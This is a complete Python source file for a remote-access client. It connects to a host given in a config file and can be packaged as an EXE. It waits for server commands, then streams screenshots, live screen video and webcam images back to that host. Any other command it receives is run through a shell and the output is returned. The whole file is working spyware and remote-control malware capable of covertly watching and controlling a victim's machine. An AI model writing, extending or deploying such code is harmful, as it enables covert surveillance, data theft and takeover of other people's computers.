import socket
import subprocess
import mss
import cv2
import time
import numpy as np
import json
import os ,sys


def resource_path(filename):
    if hasattr(sys, "_MEIPASS"):   # running as EXE
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(os.path.dirname(__file__), filename)

config_path = resource_path("client_config.json")

with open(config_path,"r") as f:
    config = json.load(f)

host_ip = config["host_ip"]


class Client:
    def __init__(self, host, port=9000):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(host)
        print("Connecting...")
        self.s.connect((host, port))
        self.s.settimeout(30)
        print("Connected")

    def receive_all(self, size):
        data = b""
        try:
            while len(data) < size:
                packet = self.s.recv(min(4096, size - len(data)))
                if not packet:
                    return None
                data += packet
            return data
        except (socket.timeout, ConnectionResetError, OSError):
            return None

    def handle_screenshot(self):
        with mss.mss() as sct:
            screen = sct.monitors[1]
            img = sct.grab(screen)

            frame = np.array(img)
            _, buffer = cv2.imencode(".jpg", frame)

            img_bytes = buffer.tobytes()

            self.s.sendall(len(img_bytes).to_bytes(8, "big"))
            time.sleep(0.05)
            self.s.sendall(img_bytes)

    def handle_screenstream(self):
        with mss.mss() as sct:
            monitor = sct.monitors[1] #select main window
            while True:
                try:
                    frame = sct.grab(monitor)
                    img = np.array(frame)

                    # resize for performance (VERY IMPORTANT)
                    img = cv2.resize(img, (800, 450))

                    #encode to jpeg
                    _, buffer = cv2.imencode('.jpg', img, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
                    data = buffer.tobytes()

                    #send data size
                    self.s.sendall(len(data).to_bytes(8,'big'))
                    # send data bytes
                    self.s.sendall(data)
                    time.sleep(0.03)

                except (BrokenPipeError, ConnectionResetError, OSError):
                    print("Server disconnected, stopping stream")
                    break

    def handle_webcapture(self):
        cap = cv2.VideoCapture(0)
        ok, frame = cap.read()

        if ok:
            _, buffer = cv2.imencode(".jpg", frame)
            data = buffer.tobytes()

            self.s.sendall(len(data).to_bytes(8, 'big'))
            self.s.sendall(data)

        cap.release()

    def handle_webstream(self):
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("Camera not accessible")
            return

        while True:
            try:
                ok, frame = cap.read()
                if ok:
                    # resize for performance
                    frame = cv2.resize(frame, (640, 360))

                    # encode frame
                    success,buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
                        
                    if not success:
                        continue

                    data = buffer.tobytes()

                    self.s.sendall(len(data).to_bytes(8,'big') + data)
                    time.sleep(0.03)
                else:
                    print("failed to get frame")
                    break

            except (BrokenPipeError, ConnectionResetError, OSError):
                        print("Server disconnected, stopping stream")
                        break
        
        cap.release()
        # send stream end signal
        self.s.sendall(b'ENDSTREAM')

    def handle_command(self, cmd):
        output = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        data = (output.stdout if output.stdout else output.stderr).encode()

        self.s.sendall(len(data).to_bytes(8, 'big'))
        self.s.sendall(data)

    def run(self):
        while True:
            try:
                cmd_size_bytes = self.receive_all(8)
                if cmd_size_bytes is None:
                    print("Connection lost (size)")
                    break

                cmd_size = int.from_bytes(cmd_size_bytes, 'big')
                cmd_bytes = self.receive_all(cmd_size)

                if cmd_bytes is None:
                    print("Connection lost (cmd)")
                    break

                cmd = cmd_bytes.decode(errors="ignore").strip()
                print("Command:", cmd)

                if cmd.lower() == "screenshot":
                    self.handle_screenshot()

                elif cmd.lower() == "screenstream":
                    self.handle_screenstream()
                    # print("Currently working in this command...")

                elif cmd.lower() == "webcapture":
                    self.handle_webcapture()
                
                elif cmd.lower() == "webstream":
                    self.handle_webstream()

                elif cmd.lower() == "exit":
                    break

                else:
                    self.handle_command(cmd)
            except:
                continue

        self.s.close()


# run client
if __name__ == "__main__":
    client = Client(host=host_ip)
    client.run()